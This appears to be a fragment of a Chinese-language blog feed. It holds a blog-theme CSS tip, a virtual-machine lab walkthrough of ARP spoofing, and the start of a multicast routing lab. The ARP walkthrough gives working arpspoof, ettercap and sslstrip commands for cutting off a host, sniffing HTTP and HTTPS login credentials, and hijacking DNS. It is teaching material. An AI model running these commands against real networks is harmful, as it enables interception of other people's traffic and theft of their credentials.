class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.nav-fixed</span> <span class="selector-id">#nav</span>&#123;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">translateY</span>(<span class="number">58px</span>)<span class="meta">!important</span>;</span><br><span class="line">    -webkit-<span class="attribute">transform</span>: <span class="built_in">translateY</span>(<span class="number">58px</span>)<span class="meta">!important</span>;</span><br><span class="line">    -moz-<span class="attribute">transform</span>: <span class="built_in">translateY</span>(<span class="number">58px</span>)<span class="meta">!important</span>;</span><br><span class="line">    -ms-<span class="attribute">transform</span>: <span class="built_in">translateY</span>(<span class="number">58px</span>)<span class="meta">!important</span>;</span><br><span class="line">    -o-<span class="attribute">transform</span>: <span class="built_in">translateY</span>(<span class="number">58px</span>)<span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#nav</span>&#123;</span><br><span class="line">    <span class="attribute">transition</span>: none<span class="meta">!important</span>;</span><br><span class="line">    -webkit-<span class="attribute">transition</span>: none<span class="meta">!important</span>;</span><br><span class="line">    -moz-<span class="attribute">transition</span>: none<span class="meta">!important</span>;</span><br><span class="line">    -ms-<span class="attribute">transition</span>: none<span class="meta">!important</span>;</span><br><span class="line">    -o-<span class="attribute">transition</span>: none<span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="引入阿里图标"><a href="#引入阿里图标" class="headerlink" title="引入阿里图标"></a>引入阿里图标</h1><p>新建iconfont.css文件</p><p>复制font class代码进入</p><p>然后再inject引入iconfont.css</p><h1 id="黑色代码框美化"><a href="#黑色代码框美化" class="headerlink" title="黑色代码框美化"></a>黑色代码框美化</h1><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel=&quot;stylesheet&quot;</span> <span class="string">href=&quot;https://cdn.jsdelivr.net/gh/sviptzk/StaticFile_HEXO@latest/butterfly/css/macblack.css&quot;&gt;</span> <span class="comment">#黑色代码框美化</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 奇奇怪怪 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> butterfly </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ARP欺骗攻击，利用ettercap工具实现DNS劫持</title>
      <link href="/posts/f95588ea/"/>
      <url>/posts/f95588ea/</url>
      
        <content type="html"><![CDATA[<h1 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h1><div style="text-indent:2em;"><font size="4">地址解析协议，即ARP（Address Resolution Protocol），是根据IP地址获取物理地址一个TCP/IP协议。</font></div><div style="text-indent:2em;"><font size="4">主机发送信息时将包含目标IP地址的ARP请求广播到局域网络上的所有主机，并接收返回消息，以此确定目标的物理地址；收到返回消息后将该IP地址和物理地址存入本机ARP缓存中并保留一定时间，下次请求时直接查询ARP缓存以节约资源。地址解析协议是建立在网络中各个主机互相信任的基础上的，局域网络上的主机可以自主发送ARP应答消息，其他主机收到应答报文时不会检测该报文的真实性就会将其记入本机ARP缓存；由此攻击者就可以向某一主机发送伪ARP应答报文，使其发送的信息无法到达预期的主机或到达错误的主机，这就构成了一个ARP欺骗。</font></div><hr><h1 id="ARP攻击"><a href="#ARP攻击" class="headerlink" title="ARP攻击"></a>ARP攻击</h1><div style="text-indent:2em;"><font size="4">ARP攻击主要是通过伪造IP地址和MAC地址进行欺骗。使以太网数据包的源地址、目标地址和ARP通信数量剧增导致网络中断或中间人攻击。ARP攻击主要存在于局域网中。若其中一台计算机感染ARP病毒。就会试图通过ARP欺骗截获局域网内其他计算机的信息，造成局域网内的计算机通信故障。</font></div><div ><font size="4"><b>1、交换网络的嗅探</b></font></div><div style="text-indent:2em;"><font size="4">假设有台主机A，B，C位于同一个交换式局域网中，监听者主机为A，而主机B、C正在进行通信，A希望能嗅探到B与C之间的通信数据，于是A就可以伪装成C对B做ARP欺骗，向B发送伪造的ARP应答包，在这个伪造的应答包中，IP地址为C的IP地址，而MAC地址为A的MAC地址：B在接收到这个应答包后，会刷新它的ARP缓存，这样在B的ARP缓存表中就出现了C的IP地址对应的是A的MAC地址，说详细点，就是让B认为C的IP地址映射到的MAC地址为主机A的MAC地址，这样，B想要发送给C的数据实际上却发送给了A，这样就达到了嗅探的目的。黑客就可以利用这种手段盗取网络上的重要信息。 </font></div><div ><font size="4"><b>2、IP地址冲突</b></font></div><div style="text-indent:2em;"><font size="4">当网络内部有计算机中了ARP病毒，网络内其他计算机就会经常弹出IP地址冲突的警告：这是怎么产生的呢?比如某主机B规定IP地址为192.168.1.18，如果它处于开机状态，那么其他主机D也把它的IP地址改为192.168.1.18就会造成IP地址冲突。其原理就是：主机D在连接网络（或更改IP地址）的时候它就会向网络内部发送ARP广播包，告诉其他计算机自己的IP地址。如果网络内部存在相同IP地址的主机B，那么B就会通过ARP来作出应答，当D接收到这个应答数据包后，D就会跳出IP地址冲突的警告，B也会弹出IP地址冲突警告：因此用ARP欺骗可以来伪造这个ARPReply，使目标主机一直受到IP地址冲突警告的困扰。</font></div><div ><font size="4"><b>3、阻止目标的数据包通过网关</b></font></div><div style="text-indent:2em;"><font size="4">比如在一个局域网内通过网关上网，那么局域网内部的计算机上的ARP缓存中就存在网关IP-MAC对应记录。如果该记录被ARP病毒更改，那么该计算机向外发送的数据包就会发送到了错误的网关硬件地址上。这样，该计算机就无法上网了。 </font></div><hr><h1 id="ARP攻击分类"><a href="#ARP攻击分类" class="headerlink" title="ARP攻击分类"></a>ARP攻击分类</h1><div style="text-indent:2em;"><font size="4">1、ARP泛洪攻击通过向网关发送大量ARP报文，导致网关无法正常响应。首先发送大量的ARP请求报文，然后又发送大量虚假的ARP响应报文，从而造成网关部分的CPU利用率上升难以响应正常服务请求，而且网关还会被错误的ARP表充满导致无法更新维护正常ARP表，消耗网络带宽资源。</font></div><div style="text-indent:2em;"><font size="4">2、ARP欺骗主机的攻击攻击者通过ARP欺骗冒充网关，使得局域网内被攻击主机发送给网关的流量信息实际上都发送给攻击者。</font></div><div style="text-indent:2em;"><font size="4">3、欺骗网关的攻击把别的主机发送给网关的数据通过欺骗网关的形式使得这些数据通过网关发送给攻击者。这种攻击目标选择的不是个人主机而是局域网的网关，这样就会攻击者源源不断的获取局域网内其他用户数据。</font></div><div style="text-indent:2em;"><font size="4">4、中间人攻击最典型的攻击之一，中间人攻击是同时欺骗局域网内的主机和网关，局域网中用户的数据和网关的数据会发给同一个攻击者，这样，用户与网关的数据就会泄露。</font></div><div style="text-indent:2em;"><font size="4">5、IP地址冲突攻击通过对局域网中的物理主机进行扫描，扫描出局域网中的物理主机的MAC地址，然后根据物理主机的MAC进行攻击，导致局域网内的主机产生IP地址冲突，影响用户的网络正常使用。</font></div><hr><h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><div><font size="4">本次实验均在虚拟机中完成！！！</font></div><blockquote><div><font size="4">Windows10  IP地址：192.168.10.128/24</font></div><div><font size="4">Kali linux       IP地址：192.168.10.129/24</font></div><div><font size="4">网关：192.168.10.2</font></div></blockquote><hr><h1 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h1><h2 id="一、ARP攻击"><a href="#一、ARP攻击" class="headerlink" title="一、ARP攻击"></a>一、ARP攻击</h2><div style="text-indent:2em;"><font size="4">在Kali linux中通过nmap扫描网断中存活的主机有哪些，然后找到要攻击的主机IP。</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/kali/image-20230307171222749.png" alt="image-20230307171222749"></p><div style="text-indent:2em;"><font size="4"><b>下载arpspoof工具</b></font></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">root用户下</span></span><br><span class="line">apt install arpspoof</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">非root用户下</span></span><br><span class="line">sudo apt install arpspoof</span><br></pre></td></tr></table></figure><div style="text-indent:2em;"><font size="4"><b>打开Windows 10虚拟机，启动CMD，长ping www.baidu.com</b></font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/kali/image-20230307171703332.png" alt="image-20230307171703332"></p><div style="text-indent:2em;"><font size="4"><b>切换至kali linux 使用root身份进行断网攻击</b></font></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> arpspoof -i eth0 -t 192.168.10.128 192.168.10.2</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-i [网卡] -t[攻击者IP 网关] 可以进行多个-t，攻击多个主机</span></span><br></pre></td></tr></table></figure><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/kali/image-20230307172556995.png" alt="image-20230307172556995"></p><div style="text-indent:2em;"><font size="4"><b>查看Windows10主机状态，出现丢包现象，网页无法打开</b></font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/kali/image-20230307172621668.png" alt="image-20230307172621668"></p><div style="text-indent:2em;"><font size="4"><b>切换至kali linux，ctrl+c停止攻击，Windows10立马恢复正常上网。</b></font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/kali/image-20230307172733140.png" alt="image-20230307172733140"></p><hr><h2 id="二、ARP欺骗"><a href="#二、ARP欺骗" class="headerlink" title="二、ARP欺骗"></a>二、ARP欺骗</h2><div><font size="4"><b>为了保证攻击主机上网正常，嗅探网页密码，在kali linux中开启IP转发功能，这样就可以截获受害者的上网信息。</b></font></div><div><font size="4"><b>打开kali linux终端，以root身份输入以下命令：</b></font></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo 1 &gt; /proc/sys/net/ipv4/ip_forward </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">默认为0，进行arpspoof时，被攻击者无法上网。1为开启IP转发</span></span><br></pre></td></tr></table></figure><div><font size="4"><b>此时，再次进行攻击，查看windows10主机的上网状态</b></font></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i eth0 -t 192.168.10.128 192.168.10.2</span><br></pre></td></tr></table></figure><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/kali/image-20230307174844789.png" alt="image-20230307174844789"></p><div><font size="4"><b>windows10正常上网</b></font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/kali/image-20230307173325427.png" alt="image-20230307173325427"></p><div><font size="4"><b>检查windows10的网关MAC地址发现，被攻击时，网关MAC被欺骗，变成了攻击者的MAC地址</b></font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/kali/image-20230307174355825.png" alt="image-20230307174355825"></p><div><font size="4"><b>使用ettercap进行嗅探，当被攻击主机访问HTTP网页时可以进行截获，同时获取登录信息。</b></font></div><div><font size="4"><b>在kali linux新建一个终端窗口，切换身份为root</b></font></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ettercap -Tq -i eth0</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">密码嗅探-T：启动文本模式  q：安静模式  -i：攻击机网卡</span></span><br></pre></td></tr></table></figure><div><font size="4"><b>在windows开启一个http网页进行登录，登陆成功后查看kali linux嗅探状态</b></font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/kali/image-20230307175923820.png" alt="image-20230307175923820"></p><div><font size="4"><b>获取到了被攻击者的网站地址，登录账户，登录密码。（网页编码原因，@字符变成了%40）</b></font></div><hr><h2 id="三、HTTPS转换"><a href="#三、HTTPS转换" class="headerlink" title="三、HTTPS转换"></a>三、HTTPS转换</h2><h3 id="HTTTPS概述"><a href="#HTTTPS概述" class="headerlink" title="HTTTPS概述"></a>HTTTPS概述</h3><div style="text-indent:2em;"><font size="4">HTTPS （全称：Hypertext Transfer Protocol Secure），是以安全为目标的 HTTP 通道，在HTTP的基础上通过传输加密和身份认证保证了传输过程的安全性 。HTTPS 在HTTP 的基础下加入SSL，HTTPS 的安全基础是 SSL，因此加密的详细内容就需要 SSL。 HTTPS 存在不同于 HTTP 的默认端口及一个加密/身份验证层（在 HTTP与 TCP之间）。这个系统提供了身份验证与加密通讯方法。它被广泛用于万维网上安全敏感的通讯，例如交易支付等方面。</font></div><h3 id="HTPS转换方式"><a href="#HTPS转换方式" class="headerlink" title="HTPS转换方式"></a>HTPS转换方式</h3><div style="text-indent:2em;"><font size="4">因为我们也需要对https网站进行嗅探，但由于https的安全特性，所以我们需要到Kali更改sslstrip 配置文件，然后把https转换为http,使用sslstrip进行转换</font></div><blockquote><div style="text-indent:2em;"><font size="4">sslstrip， 主要是使用中间人攻击方式，在客户端到 服务器之间设置一个代理服务器,然后代理服务器会使用其相应的有效 SSL 证书连接客户端到真实服务器，所以从而绕过服务端的检测</font></div></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">kali linux以root身份输入</span></span><br><span class="line">vim  /etc/ettercap/etter.conf</span><br></pre></td></tr></table></figure><div style="text-indent:2em;"><font size="4">vim进入后，按下 i 键，进入编辑模式，找到这四行代码，前面的#注释去掉。然后按下Esc，Shift+：（冒号）,wq（保存，退出）</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/kali/image-20230307180838252.png" alt="image-20230307180838252"></p><div style="text-indent:2em;"><font size="4">使用sslstrip功能，保持窗口运行！</font></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sslstrip -a -f -k#访问htps网站时强制转换为http</span><br></pre></td></tr></table></figure><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/kali/image-20230307181206158.png" alt="image-20230307181206158"></p><div style="text-indent:2em;"><font size="4">在windows10主机上访问一个https网站，就会弹出安全警告</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/kali/image-20230307181713139.png" alt="image-20230307181713139"></p><div style="text-indent:2em;"><font size="4">尝试登录一个HTTPS加密的网站，查看是否会截获信息</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/kali/image-20230307182619533.png" alt="image-20230307182619533"></p><div style="text-indent:2em;"><font size="4">成功嗅探登录用户名和密码!!!</font></div><hr><h2 id="四、DNS劫持"><a href="#四、DNS劫持" class="headerlink" title="四、DNS劫持"></a>四、DNS劫持</h2><h3 id="DNS概述"><a href="#DNS概述" class="headerlink" title="DNS概述"></a>DNS概述</h3><div style="text-indent:2em;"><font size="4"><b>域名系统</b>（英文：<b>D</b>omain <b>N</b>ame <b>S</b>ystem，缩写：<b>DNS</b>）是互联网的一项服务。它作为将域名和IP地址相互映射的一个分布式数据库，能够使人更方便地访问互联网。DNS使用UDP端口53。</font></div><div style="text-indent:2em;"><font size="4"><b>DNS劫持</b>又称<b>域名劫持</b>，是指在劫持的网络范围内拦截域名解析的请求，分析请求的域名，把审查范围以外的请求放行，否则返回假的IP地址或者什么都不做使请求失去响应，其效果就是对特定的网络不能访问或访问的是假网址。</font></div><hr><h3 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h3><div style="text-indent:2em;"><font size="4">修改 ettercap 的配置文件 => vim /etc/ettercap/etter.dns ( A和PTR 指向的地址一般相同 )</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/kali/image-20230313123756292.png" alt="image-20230313123756292"></p><h3 id="构建HTML文件"><a href="#构建HTML文件" class="headerlink" title="构建HTML文件"></a>构建HTML文件</h3><div style="text-indent:2em;"><font size="4">也可以使用默认的HTML文件，自己有的话也可以cd var/www/html复制到目录下</font></div><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vim /var/www/html/index.html</span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">size</span>=<span class="string">&quot;200&quot;</span> <span class="attr">color</span>=<span class="string">&quot;red&quot;</span>&gt;</span> Hello!!! <span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">size</span>=<span class="string">&quot;300&quot;</span> <span class="attr">color</span>=<span class="string">&quot;green&quot;</span>&gt;</span> Are U OK??? <span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">size</span>=<span class="string">&quot;400&quot;</span> <span class="attr">color</span>=<span class="string">&quot;blue&quot;</span>&gt;</span> Are U Kiding Me??? <span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="启动Apache服务器"><a href="#启动Apache服务器" class="headerlink" title="启动Apache服务器"></a>启动Apache服务器</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service apache2 start</span><br></pre></td></tr></table></figure><h3 id="启动ettercap软件"><a href="#启动ettercap软件" class="headerlink" title="启动ettercap软件"></a>启动ettercap软件</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ettercap -G   #显示图形化界面</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">如果没有，终端运行apt-get install ettercap下载</span></span><br></pre></td></tr></table></figure><h3 id="扫描主机"><a href="#扫描主机" class="headerlink" title="扫描主机"></a>扫描主机</h3><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/kali/image-20230313124013941.png" alt="image-20230313124013941"></p><div style="text-indent:2em;"><font size="4"><b>列出Hosts列表</b></font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/kali/image-20230313124038252.png" alt="image-20230313124038252"></p><h3 id="选择攻击方式"><a href="#选择攻击方式" class="headerlink" title="选择攻击方式"></a>选择攻击方式</h3><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/kali/image-20230313124102333.png" alt="image-20230313124102333"></p><h3 id="选择攻击插件"><a href="#选择攻击插件" class="headerlink" title="选择攻击插件"></a>选择攻击插件</h3><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/kali/image-20230313124124480.png" alt="image-20230313124124480"></p><div style="text-indent:2em;"><font size="4">选择DNS劫持插件，左上角启动按钮</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/kali/image-20230313124156852.png" alt="image-20230313124156852"></p><h3 id="windows10测试"><a href="#windows10测试" class="headerlink" title="windows10测试"></a>windows10测试</h3><div style="text-indent:2em;"><font size="4">HTTPS网页无法正常打开，但是网络显示正常</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/kali/image-20230313124223819.png" alt="image-20230313124223819"></p><div style="text-indent:2em;"><font size="4">访问HTTP网站，跳转到我们构建的页面，这里测试访问一下“大学资源网（http://www.dxzy163.com/）”</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/kali/image-20230313124256895.png" alt="image-20230313124256895"></p><hr><div><font size="6"><b><center>网络安全始于心，安全网络践于行</center></b></font></div><div><font size="6"><b><center>守护网络安全，呵护精神家园</center></b></font></div><hr>]]></content>
      
      
      <categories>
          
          <category> 学习实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kali-Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>组播PIM-DM实验</title>
      <link href="/posts/75790557/"/>
      <url>/posts/75790557/</url>
      
        <content type="html"><![CDATA[<h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><ul><li><div><font size="4">理解Multicast的一些基本概念以及工作原理</font></div></li><li><div><font size="4">掌握PIM dense-mode的基本配置</font></div></li><li><div><font size="4">掌握IGMP的配置方法</font></div></li><li><div><font size="4">理解 PIM dense-mode的assert机制</font></div></li><li><div><font size="4">理解RPF的工作原理</font></div></li></ul><hr><h1 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h1><ol><li><div><font size="4">网络内部使用OSPF动态路由协议，确保单播路由正常。（为了后续RPF检查）</font></div></li><li><div><font size="4">路由器开启组播功能以及直连接口下开启pim-dm。</font></div></li><li><div><font size="4">组播路由设备：第一跳设备（AR1）连接源以及最后一跳设备连接接收者的接口必须使能 pim协议</font></div></li></ol><hr><h1 id="实验拓扑"><a href="#实验拓扑" class="headerlink" title="实验拓扑"></a>实验拓扑</h1><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20230217125346467.png" alt="image-20230217125346467"></p><p>配置完成的文件：<a href="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/tuopu/Mcast%28%E5%B7%B2%E5%AE%8C%E6%88%90%29.zip">https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/tuopu/Mcast%28%E5%B7%B2%E5%AE%8C%E6%88%90%29.zip</a></p><p>无配置的文件：<a href="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/tuopu/Mcast%28%E6%97%A0%E9%85%8D%E7%BD%AE%29.zip">https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/tuopu/Mcast%28%E6%97%A0%E9%85%8D%E7%BD%AE%29.zip</a></p><hr><h1 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h1><h2 id="基础路由配置"><a href="#基础路由配置" class="headerlink" title="基础路由配置"></a>基础路由配置</h2><div><font size="4">配置全网路由，内部网络使用动态路由协议OSPF</font></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#配置AR1</span><br><span class="line">[R1]interface GigabitEthernet0/0/0</span><br><span class="line">[R1-GigabitEthernet0/0/0]ip address 100.1.1.254 24</span><br><span class="line">[R1-GigabitEthernet0/0/0]ospf enable 1 area 0.0.0.0</span><br><span class="line">[R1]interface GigabitEthernet0/0/1</span><br><span class="line">[R1-GigabitEthernet0/0/1]ip address 10.1.1.1 24</span><br><span class="line">[R1-GigabitEthernet0/0/1]ospf enable 1 area 0.0.0.0</span><br><span class="line">#创建ospf编号以及区域，否则无法发现邻居</span><br><span class="line">[R1]ospf 1</span><br><span class="line">[R1-ospf-1]ar 0</span><br><span class="line">[R1-ospf-1-area-0.0.0.0]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#配置AR2</span><br><span class="line">[R2]interface GigabitEthernet0/0/0</span><br><span class="line">[R2-GigabitEthernet0/0/0]ip address 24.1.1.2 24</span><br><span class="line">[R2-GigabitEthernet0/0/0]ospf enable 1 area 0.0.0.0</span><br><span class="line">[R2]interface GigabitEthernet0/0/1</span><br><span class="line">[R2-GigabitEthernet0/0/1]ip address 10.1.1.2 24</span><br><span class="line">[R2-GigabitEthernet0/0/1]ospf enable 1 area 0.0.0.0</span><br><span class="line">[R2]interface LoopBack 0</span><br><span class="line">[R2-LoopBack0]ip address 22.1.1.1 24</span><br><span class="line">[R2-LoopBack0]ospf enable 1 area 0.0.0.0</span><br><span class="line">#创建ospf编号以及区域，否则无法发现邻居</span><br><span class="line">[R2]ospf 1</span><br><span class="line">[R2-ospf-1]ar 0</span><br><span class="line">[R2-ospf-1-area-0.0.0.0]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#配置AR3</span><br><span class="line">[R3]interface GigabitEthernet0/0/0</span><br><span class="line">[R3-GigabitEthernet0/0/0]ip address 35.1.1.3 24</span><br><span class="line">[R3-GigabitEthernet0/0/0]ospf enable 1 area 0.0.0.0</span><br><span class="line">[R3]interface GigabitEthernet0/0/1</span><br><span class="line">[R3-GigabitEthernet0/0/1]ip address 10.1.1.3 24</span><br><span class="line">[R3-GigabitEthernet0/0/1]ospf enable 1 area 0.0.0.0</span><br><span class="line">[R3]interface LoopBack 0</span><br><span class="line">[R3-LoopBack0]ip address 33.1.1.1 24</span><br><span class="line">[R3-LoopBack0]ospf enable 1 area 0.0.0.0</span><br><span class="line">#创建ospf编号以及区域，否则无法发现邻居</span><br><span class="line">[R3]ospf 1</span><br><span class="line">[R3-ospf-1]ar 0</span><br><span class="line">[R3-ospf-1-area-0.0.0.0]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#配置AR4</span><br><span class="line">[R4]interface GigabitEthernet0/0/0</span><br><span class="line">[R4-GigabitEthernet0/0/0]ip address 24.1.1.4 24</span><br><span class="line">[R4-GigabitEthernet0/0/0]ospf enable 1 area 0.0.0.0</span><br><span class="line">[R4]interface GigabitEthernet0/0/1</span><br><span class="line">[R4-GigabitEthernet0/0/1]ip address 45.1.1.4 24</span><br><span class="line">[R4-GigabitEthernet0/0/1]ospf enable 1 area 0.0.0.0</span><br><span class="line">[R4]interface GigabitEthernet0/0/2</span><br><span class="line">[R4-GigabitEthernet0/0/2]ip address 10.1.2.6 24</span><br><span class="line">[R4-GigabitEthernet0/0/2]ospf enable 1 area 0.0.0.0</span><br><span class="line">[R4]interface LoopBack 0</span><br><span class="line">[R4-LoopBack0]ip address 44.1.1.1 24</span><br><span class="line">[R4-LoopBack0]ospf enable 1 area 0.0.0.0</span><br><span class="line">#创建ospf编号以及区域，否则无法发现邻居</span><br><span class="line">[R4]ospf 1</span><br><span class="line">[R4-ospf-1]ar 0</span><br><span class="line">[R4-ospf-1-area-0.0.0.0]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#配置AR5</span><br><span class="line">[R5]interface GigabitEthernet0/0/0</span><br><span class="line">[R5-GigabitEthernet0/0/0]ip address 35.1.1.5 24</span><br><span class="line">[R5-GigabitEthernet0/0/0]ospf enable 1 area 0.0.0.0</span><br><span class="line">[R5]interface GigabitEthernet0/0/1</span><br><span class="line">[R5-GigabitEthernet0/0/1]ip address 45.1.1.5 24</span><br><span class="line">[R5-GigabitEthernet0/0/1]ospf enable 1 area 0.0.0.0</span><br><span class="line">[R5]interface GigabitEthernet0/0/2</span><br><span class="line">[R5-GigabitEthernet0/0/2]ip address 10.1.2.5 24</span><br><span class="line">[R5-GigabitEthernet0/0/2]ospf enable 1 area 0.0.0.0</span><br><span class="line">[R5]interface LoopBack 0</span><br><span class="line">[R5-LoopBack0]ip address 55.1.1.1 24</span><br><span class="line">[R5-LoopBack0]ospf enable 1 area 0.0.0.0</span><br><span class="line">#创建ospf编号以及区域，否则无法发现邻居</span><br><span class="line">[R5]ospf 1</span><br><span class="line">[R5-ospf-1]ar 0</span><br><span class="line">[R5-ospf-1-area-0.0.0.0]</span><br></pre></td></tr></table></figure><div><font size="4"><b>配置组播源</b></font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/zuboyuan.jpg" alt="zuboyuan"></p><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/zuboyuan1.jpg" 